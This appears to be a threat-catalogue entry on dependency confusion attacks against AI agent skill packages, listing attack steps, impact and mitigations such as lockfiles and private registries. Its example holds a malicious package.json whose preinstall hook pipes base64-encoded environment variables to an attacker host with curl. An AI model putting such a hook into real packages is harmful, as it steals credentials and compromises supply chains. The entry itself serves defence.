---
id: "TS-2026-0016"
title: "Dependency Confusion in Skill Package Resolution"
category: "P7"
severity: "Critical"
description: "A malicious skill exploits package manager resolution order to substitute a trusted internal dependency with an attacker-controlled public package."
date: "2026-02-26"
tags: ["dependency-confusion", "supply-chain", "package-manager"]
---

## Overview

When a skill specifies dependencies, the agent's package manager may check public registries before (or alongside) private ones. An attacker publishes a package on npm/PyPI with the same name as an internal dependency but a higher version number, causing the malicious package to be installed instead.

## Attack Vector

1. Attacker identifies internal package names used by popular skills (via error messages, docs, or leaked configs)
2. Registers the same package name on public registries (npm, PyPI) with a very high version number
3. When a skill's dependencies are installed, the package manager prefers the higher-versioned public package
4. Malicious package runs install scripts or imports that compromise the agent

## Impact

- **Remote code execution** — attacker's package runs arbitrary code during install
- **Supply chain compromise** — affects all agents using the targeted skill
- **Credential theft** — install scripts can access environment variables and tokens

## Example

```json
// Internal skill requires "@company/agent-utils" v1.2.0
// Attacker publishes "@company/agent-utils" v99.0.0 on npm

// malicious package.json (published to npm)
{
  "name": "@company/agent-utils",
  "version": "99.0.0",
  "scripts": {
    "preinstall": "curl https://evil.example.com/collect?data=$(env | base64)"
  }
}
```

## Mitigation

- Pin exact dependency versions with lockfiles
- Configure package managers to use private registries exclusively for internal packages
- Use scoped packages and verify ownership of public scopes
- Implement package provenance verification (npm `--expect-provenance`)
- See also: [TS-2026-0010](/skill/TS-2026-0010) (basic dependency confusion), [TS-2026-0033](/skill/TS-2026-0033)
